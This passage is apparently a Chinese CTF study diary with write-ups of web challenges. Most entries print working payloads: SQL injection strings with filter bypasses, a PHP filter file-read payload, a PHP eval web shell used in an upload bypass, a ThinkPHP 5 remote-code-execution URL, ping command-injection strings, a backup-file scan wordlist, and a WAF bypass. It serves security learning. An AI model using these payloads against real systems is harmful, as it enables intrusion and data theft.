就会使百where后面的表达式变成一句可有可无的表达式，因为or前面执行成功，且1=1为真。不会报错  - 就与select * from （表名）相等然后就可以通过这种句式来取得当前数据表中所有的用户信息答。  - 但显然失败了，猜测表名应该是words，所以才没有显示flag，所以可能是select * from words where id = 变量</code></pre><pre><code>1&#39;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</code></pre><p>解释：</p><pre><code>- rename table `words` to `words1`; 修改表 words 改名为其它，- rename table `1919810931114514` to `words`;修改表 1919810931114514 改名为 words ，- alter table `words` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not NULL;修改列 flag 改名为 id ，- 或者可以 alter table words add id int unsigned not Null auto_increment primary key;在表 1919810931114514 插入一列 id，- 然后再 1&#39; or 1=1# ，展示flag</code></pre><h3 id="2021-4-27补充："><a href="#2021-4-27补充：" class="headerlink" title="2021-4-27补充："></a>2021-4-27补充：</h3><p>已经学习完了alter语句，和预变量</p><p>这里主要对预处理进行解释：</p><pre><code>SET @tn = &#39;`1919810931114514`&#39;;  //存储表名SET @sql = concat(&#39;select * from &#39;, @tn);  //存储SQL语句PREPARE name from @sql;   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句</code></pre><p>或者：</p><p>利用char()函数将select字符串的ASCII码转为select字符串，接着用concat()函数镜像拼接到select查询语句，从而绕过过滤</p><pre><code>1&#39;;PREPARE hacker from concat(char(115,101,108,101,99,116), &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><pre><code>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from `1919810931114514`&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</code></pre><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><pre><code>flag{e5334182-fc16-4c20-8ac3-753301d2925d}</code></pre><p>VARCHAR(size)：保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。<strong>注释：</strong>如果值的长度大于 255，则被转换为 TEXT 类型。</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>php伪协议</p><p>特点：文件包含，/?file=flag.php</p><p>payload:file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>得：PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzEyOTZhNWUtZjRiMy00ZTY1LTg5MGEtOThjNjZhMWU5MWI0fQo=</p><p>base64得：</p><pre><code>&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>小马：</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>首先上传.php文件发现对后缀进行了限制</p><p>改为shell.php.png同时抓包删除png</p><p>得到一个页面以后查看源代码发现：</p><p>Upload Success! Look here~ ./uplo4d/3d694425bf5c9803db0c7b3d776cd2f1.png</p><p>发现确实存在，但是被重命名了，而且变成了一个png</p><p>重新尝试后缀绕过shell.phtml（通过抓包修改）</p><p>得到：</p><p>Upload Success! Look here~ ./uplo4d/bd914ca4997d34857501cefab0064162.phtml</p><p>回到根目录查看flag即可</p><p>或者数据终端cat /flag</p><h1 id="2021-01-25"><a href="#2021-01-25" class="headerlink" title="2021-01-25"></a>2021-01-25</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>用户名：1’ or 1=1#</p><p>密码：123</p><p>得到flag：flag{161e4d70-8d13-4f80-8a96-c01d5eb7b540}</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看源代码：</p><pre><code>                &lt;!--        $cat=$_GET[&#39;cat&#39;];        echo $cat;        if($cat==&#39;dog&#39;){            echo &#39;Syc{cat_cat_cat_cat}&#39;;        }        --&gt;</code></pre><p>构造参数?cat=dog,结果直接得到了flag：flag{1fb1365e-7d13-4ee4-94ec-e93656f4d96e}</p><p>什么情况？？这也太。。。</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>输入1的结果与输入3-2的结果一样。所以判断为整数型注入，接下来构造注入语句：</p><p>当我输入-1 union select 1,2#和其他字符转的时候，都会被转义，所以就很有可能是被转义了，联合查询放弃，考虑堆叠注入：</p><p>1;show databases;#（展现所有数据库）</p><p>得到结果：</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</code></pre><p>我感觉在test里面，构造语句：1;show tables from test;#结果是一点不好使</p><p>当输入1;show tables;时候回显：</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</code></pre><p>ok，看wp吧：也不知道是怎么想的，</p><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>输入的内容为*,1</p><p>内置的sql语句为：select $post[‘query’]||flag from Flag</p><p>如果$post[‘query’]的数据为<em>,1，sql语句就变成了select </em>,1||flag from Flag（此时||是逻辑“或”）也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内</p><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>1.输入 1 或 0 查询结果如图，要想办法让 ||不是逻辑或<br>官方给的 payload 是1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p>拼接一下就是select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p><p>关于 sql_mode : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的PIPES_AS_CONCAT将 ||视为字符串的连接操作符而非 “或” 运算符</p><p>2.这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个||相当于是将 select 1 和 select flag from flag 的结果拼接在一起</p><p>自我理解：sql_mode=PIPES_AS_CONCAT将后面查询的结果同时输出</p><p>不错，挺好的题，盗：</p><pre><code>附加几种常见的sql_mode值的介绍：几种常见的mode介绍ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULLNO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</code></pre><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>后端结构是username=’’passwd=’’</p><p>注入开始：username=’1’ or 1 = 1#passwd=’’</p><p>得到回显：<strong>Hello admin！</strong></p><p><strong>Your password is ‘817b66fd2bafc98336e2618cf0e66578’</strong></p><p>构造username=’admin’passwd=’817b66fd2bafc98336e2618cf0e66578’</p><p>密码是flag嘛。。。flag{817b66fd2bafc98336e2618cf0e66578}也不对，难道密码是个表？？继续构造：</p><p>username=’admin’ union select table_name from 817b66fd2bafc98336e2618cf0e66578#’passwd=’’</p><p>得到：<strong>Table ‘geek.817b66fd2bafc98336e2618cf0e66578’ doesn’t exist</strong></p><p>继续：username=’admin’ order by 3#’passwd=’’</p><p>返回结果与成功登陆admin结果一样</p><p>继续admin’ order by 4#</p><p>得到回显：<strong>Unknown column ‘4’ in ‘order clause’</strong>，好，3列确定了，继续构造：1’ union select 1,2,3#得到：</p><p><strong>Hello 2！</strong><br><strong>Your password is ‘3’</strong></p><p>懂了：</p><pre><code>1&#39; union select 1,2,database()#</code></pre><p>得到数据库<strong>geek</strong></p><pre><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘geekuser,l0ve1ysq1’</strong></p><pre><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘id,username,password’</strong></p><pre><code>1&#39; union select 1,2,group_concat(password) from l0ve1ysq1#</code></pre><p>flag{7aa6a786-5f9b-4a75-a742-5b380e79dcd2}</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>其实这个题与lovesql相似</p><p>进行了过滤,输入1’ or 1=1#发现变成了： ‘1=1#’</p><p>可能过滤字符： select or and union from where</p><p>输入：</p><pre><code>1&#39; oorr 1=1#</code></pre><p>得到：<strong>Hello admin！Your password is ‘232dc50f903a404ea874ef30b680a9a4’</strong></p><pre><code>1&#39; uniunionon selselectect 1,2,3#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘3’</strong></p><pre><code>1&#39; uniunionon selselectect 1,2,database()#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘geek’</strong>（数据库geek）</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_name=&#39;geek&#39;#</code></pre><p>得到回显：<strong>Table ‘infmation_schema.tables’ doesn’t exist</strong></p><p>注意：是information，故information改为infoorrmation</p><p>但是没有返回值</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39;#</code></pre><p>得到：<strong>Hello 2！Your password is ‘b4bsql,geekuser’</strong></p><p>得到表：b4bsql,geekuser</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘id,username,password’</strong></p><p>读取列中的字段</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql#</code></pre><p>flag{363a0dd2-accf-4355-878e-84eaf3f6f674}</p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>updatexml()，extractvalue()报错注入解决问题，经过我分析，这两个报错函数语句相同。</p><p>分析语句：</p><p>database()</p><p>select(())</p><p>concat(0x7e,(),0x7e)</p><p>undatexml(1,,1)</p><p>extractvalue(1,,1)</p><p>注入句式：</p><pre><code>admin&#39;or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘<del>geek</del>‘</strong>（数据库）</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘<del>H4rDsq1</del>‘</strong>（表）</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘<del>id,username,password</del>‘</strong></p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(passWord))from(H4rDsq1)),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘~flag{576fb8c1-905c-4202-8f82-60’</strong></p><p>只是得到了一半flag</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,30))))from(H4rDsq1)),0x7e),1))#</code></pre><p>得到回显：XPATH syntax error: ‘<del>1-905c-4202-8f82-605354bf4c57}</del>‘</p><p>flag{576fb8c1-905c-4202-8f82-605354bf4c57}</p><p>嘶~不错</p><h1 id="2021-01-26"><a href="#2021-01-26" class="headerlink" title="2021-01-26"></a>2021-01-26</h1><p>starsnowctf：<a href="http://ctf.starsnowsec.cn/challenges" target="_blank" rel="noopener">http://ctf.starsnowsec.cn/challenges</a></p><h2 id="Rao"><a href="#Rao" class="headerlink" title="Rao"></a>Rao</h2><pre><code>&lt;?php  if (isset($_POST[&quot;login&quot;]))  {  if (isset($_POST[&#39;yingzi&#39;]))  {    if (preg_match(&quot;[a-zA-Z0-9]&quot;, $_POST[&#39;yingzi&#39;]) === FALSE)    {      exit(&#39;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#39;);    }    elseif (strlen($_POST[&#39;yingzi&#39;]) &lt; 10 &amp;&amp; $_POST[&#39;yingzi&#39;] &gt; 987654321)    {      if (strpos($_POST[&#39;yingzi&#39;], &#39;#BIG#&#39;) !== FALSE)      {        if (!is_array($_POST[&#39;yingzi&#39;])) {        include(&quot;./flag.php&quot;);        echo &quot;Congratulations! FLAG is : &quot;.$flag;        }        else      {        exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);      }      }      else      {        exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);      }    }    else    {      exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);    }  }}show_source(__FILE__);?&gt;</code></pre><p>逐一分析：</p><p>1.首先</p><pre><code>&lt;?php  if (isset($_POST[&quot;login&quot;]))  {  if (isset($_POST[&#39;yingzi&#39;]))</code></pre><p>判断是否设置了这两个参数</p><p>2.其次</p><pre><code>if (preg_match(&quot;[a-zA-Z0-9]&quot;, $_POST[&#39;yingzi&#39;]) === FALSE)</code></pre><p>将参数yingzi里面的值进行正则匹配，这就意味着必须是26英文字母大小写+数字</p><p>3.然后</p><pre><code> elseif (strlen($_POST[&#39;yingzi&#39;]) &lt; 10 &amp;&amp; $_POST[&#39;yingzi&#39;] &gt; 987654321)</code></pre><p>判断yingzi传的参数长度是否小于10同时满足yingzi传入的参数数值大于987654321</p><p>4.再就是</p><pre><code> if (strpos($_POST[&#39;yingzi&#39;], &#39;#BIG#&#39;) !== FALSE)</code></pre><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p><p><strong>注释：</strong>strpos() 函数对大小写敏感。</p><pre><code>strpos(string,find,start)string    必需。规定要搜索的字符串。find    必需。规定要查找的字符串。start    可选。规定在何处开始搜索。</code></pre><p>也就是说利用这个来检索yingzi中是否含有#BIG#</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8826%E6%97%A52148_2.png" alt></p><p>Congratulations! FLAG is : flag{rao_rao_rao}</p><p>解释：9e99=9*10^99</p><h2 id="ThinkPHP-5-Rce"><a href="#ThinkPHP-5-Rce" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h2><p>Thinkphp5 5.0.22/5.1.29远程代码执行漏洞：</p><pre><code>/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></pre><h2 id="Mini-httpd-2018"><a href="#Mini-httpd-2018" class="headerlink" title="Mini_httpd 2018"></a>Mini_httpd 2018</h2><pre><code>GET /flag HTTP/1.1Host: Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close</code></pre><p>l漏洞复现：</p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/106854028" target="_blank" rel="noopener">https://blog.csdn.net/xuandao_ahfengren/article/details/106854028</a></p><h1 id="2021-01-27"><a href="#2021-01-27" class="headerlink" title="2021-01-27"></a>2021-01-27</h1><p>学习php</p><p><a href="https://www.runoob.com/php/php-syntax.html" target="_blank" rel="noopener">PHP 语法</a></p><p><a href="https://www.runoob.com/php/php-variables.html" target="_blank" rel="noopener">PHP 变量</a></p><p><a href="https://www.runoob.com/php/php-echo-print.html" target="_blank" rel="noopener">PHP echo/print</a></p><p><a href="https://www.runoob.com/php/php-datatypes.html" target="_blank" rel="noopener">PHP 数据类型</a></p><p><a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">PHP 类型比较</a></p><p><a href="https://www.runoob.com/php/php-constants.html" target="_blank" rel="noopener">PHP 常量</a></p><p><a href="https://www.runoob.com/php/php-string.html" target="_blank" rel="noopener">PHP 字符串</a></p><p><a href="https://www.runoob.com/php/php-operators.html" target="_blank" rel="noopener">PHP 运算符</a></p><h1 id="2021-01-28"><a href="#2021-01-28" class="headerlink" title="2021-01-28"></a>2021-01-28</h1><p><a href="https://www.runoob.com/php/php-if-else.html" target="_blank" rel="noopener">PHP If…Else</a></p><p><a href="https://www.runoob.com/php/php-switch.html" target="_blank" rel="noopener">PHP Switch</a></p><p><a href="https://www.runoob.com/php/php-arrays.html" target="_blank" rel="noopener">PHP 数组</a></p><p><a href="https://www.runoob.com/php/php-arrays-sort.html" target="_blank" rel="noopener">PHP 数组排序</a></p><p><a href="https://www.runoob.com/php/php-superglobals.html" target="_blank" rel="noopener">PHP 超级全局变量</a></p><p><a href="https://www.runoob.com/php/php-looping.html" target="_blank" rel="noopener">PHP While 循环</a></p><p><a href="https://www.runoob.com/php/php-looping-for.html" target="_blank" rel="noopener">PHP For 循环</a></p><p><a href="https://www.runoob.com/php/php-functions.html" target="_blank" rel="noopener">PHP 函数</a></p><h1 id="2021-01-29"><a href="#2021-01-29" class="headerlink" title="2021-01-29"></a>2021-01-29</h1><p>黑马教程-p53</p><h1 id="2021-01-30"><a href="#2021-01-30" class="headerlink" title="2021-01-30"></a>2021-01-30</h1><p>黑马教程p54+16=p70</p><h1 id="2021-01-31"><a href="#2021-01-31" class="headerlink" title="2021-01-31"></a>2021-01-31</h1><p>黑马教程p70+16=p86</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>怎么说呢~，一切都在源代码里面</p><p>闯关总结：</p><p>1.如果说已经展示完了，但是你什么都不知道，那么只能说明一个问题，就是：你太慢了，需要一帧一帧的抓包来读取2.说flag就在这个页面，那么就是在源代码里面，但是源代码里面没有的话，那么用php://filter来读取</p><p>函数积累：</p><p>stristr() 函数查找字符串在另一个字符串中第一次出现的位置。如果成功，则返回字符串的其余部分（从匹配点）。如果没有找到该字符串，则返回 false。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>看了别人的wp，知道这是通过构造来得到命令执行的效果：</p><p>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</p><p>/?ip=;cat$IFS$9`ls``（直接将当前目录下所有文件全部cat出来，查看源码发现flag）</p><p>关于preg_match() 函数：<a href="https://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-preg_match.html</a></p><h1 id="2021-02-01"><a href="#2021-02-01" class="headerlink" title="2021-02-01"></a>2021-02-01</h1><p>黑马教程p86-p96</p><h1 id="2021-02-02"><a href="#2021-02-02" class="headerlink" title="2021-02-02"></a>2021-02-02</h1><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>也是一个关于ping的题目</p><p>直接1;cat /flag一把梭</p><h1 id="2021-02-03"><a href="#2021-02-03" class="headerlink" title="2021-02-03"></a>2021-02-03</h1><p>？？？</p><h1 id="2021-02-04"><a href="#2021-02-04" class="headerlink" title="2021-02-04"></a>2021-02-04</h1><p>小年快乐</p><h1 id="2021-02-10"><a href="#2021-02-10" class="headerlink" title="2021-02-10"></a>2021-02-10</h1><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><pre><code>我家菜刀丢了，你能帮我找一下么eval($_POST[&quot;Syc&quot;]);</code></pre><p>这应该直接密码Syc连接就行了吧</p><p>跟录下得到flag：</p><p>flag{26664be8-9ad5-4c5b-ba11-2584c6c5f937}</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>首先会在源代码里面发现在前端呈现页面没有的需要点击的文件，secret.php，打开以后会显示：It doesn’t come from ‘<a href="https://www.Sycsecret.com&#39;关于前一个跳转过来的连接是由referer决定的，就好比很多拉人的活动，应该也是判断referer来计数的，当我改完referer头以后，会显示：Please" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;关于前一个跳转过来的连接是由referer决定的，就好比很多拉人的活动，应该也是判断referer来计数的，当我改完referer头以后，会显示：Please</a> use “Syclover” browser也就是说，让我用syclover浏览器来搞这个，关于反映浏览器的信息好像是user-agent在web二级里面会涉及这一方面的知识，完成修改浏览器信息后，显示：No!!! you can only read this locally!!!这应该是xforwaredfor伪协议添加一个127.0.0.1就ok，得到：flag{692f0abe-00c2-47ec-a5f9-2001d860b4f5}</p><p>考查知识点：http头信息里面每个的理解</p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>右上角点击payflag，源代码里面出现：</p><pre><code>&lt;!--    ~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) {    $password = $_POST[&#39;password&#39;];    if (is_numeric($password)) {        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    }elseif ($password == 404) {        echo &quot;Password Right!&lt;/br&gt;&quot;;    }}--&gt;</code></pre><p>post传参并且=404同时满足不能为数字，所以可以用字符串代替404e1，hackbar构造即可，但是还有一句话：Only Cuit’s students can buy the FLAG，抓包将user改为1即可。出现提示字样，让我支付flag，按照提示还需要post传入有money，所以password=404e&amp;money=1e9即可：flag{f7fed39d-bd40-4607-a830-6d8026fc962d}</p><h1 id="2021-03-13"><a href="#2021-03-13" class="headerlink" title="2021-03-13"></a>2021-03-13</h1><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>hints：因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</p><p>burp字典：</p><pre><code>.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B403%E6%9C%8813%E6%97%A50901_1.png" alt></p><p>在此处载入字典或者御剑把线程开低点，都可以扫描到<a href="http://www.zip文件，下载即可" target="_blank" rel="noopener">www.zip文件，下载即可</a></p><p>index.php中的重点内容为</p><pre><code>&lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;</code></pre><p>将get传入的参数select的值反序列化</p><p>class.php内容</p><pre><code>&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>未完待续</p><h1 id="2021-03-16"><a href="#2021-03-16" class="headerlink" title="2021-03-16"></a>2021-03-16</h1><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a><a href="https://blog.csdn.net/qq_42967398/article/details/103512717?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1328655.9839.16158640888136911&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control" target="_blank" rel="noopener">[RoarCTF 2019]Easy Calc</a></h2><p><strong>考点：PHP的字符串解析特性</strong></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714" target="_blank" rel="noopener">wp1</a></p><p>右键查看源代码</p><pre><code>&lt;!--I&#39;ve set up WAF to ensure security.--&gt;&lt;script&gt;    $(&#39;#calc&#39;).submit(function(){        $.ajax({            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),            type:&#39;GET&#39;,            success:function(data){                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;            &lt;strong&gt;答案:&lt;/strong&gt;${data}            &lt;/div&gt;`);            },            error:function(){                alert(&quot;这啥?算不来!&quot;);            }        })        return false;    })&lt;/script&gt;</code></pre><p>打开calc.php文件</p><pre><code>&lt;?phperror_reporting(0);//不显示任何报错if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt; </code></pre><p>绕过方式：</p><p>假如waf不允许num变量传递字母：</p><pre><code>http://www.xxx.com/index.php?num=phpinfo()</code></pre><p>那么我们可以在num前加个空格(或者非法字符)：</p><pre><code>http://www.xxx.com/index.php? num = phpinfo()</code></pre><p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p><p>函数利用：</p><p>scandir()函数列出 参数目录 中的文件和目录，要不然我们怎么知道flag在哪。</p><p>chr（）函数，将ascii码进行转码</p><p><a href="https://www.runoob.com/php/func-filesystem-file-get-contents.html" target="_blank" rel="noopener">file_get_contents() 把整个文件读入一个字符串中。</a></p><p><a href="https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&fromid=99077&fr=aladdin" target="_blank" rel="noopener">ascii码</a></p><p>构造参数</p><pre><code>calc.php? num=var_dump(scandir(chr(47)))calc.php? num=var_dump(scandir(/)</code></pre><p>来显示根目录</p><pre><code>calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))calc.php?%20num=file_get_contents(/flagg)</code></pre><p>方法二：<a href="https://www.jianshu.com/p/357bfe8429ff" target="_blank" rel="noopener">http走私攻击</a></p><h1 id="2021-03-19续2021-03-13"><a 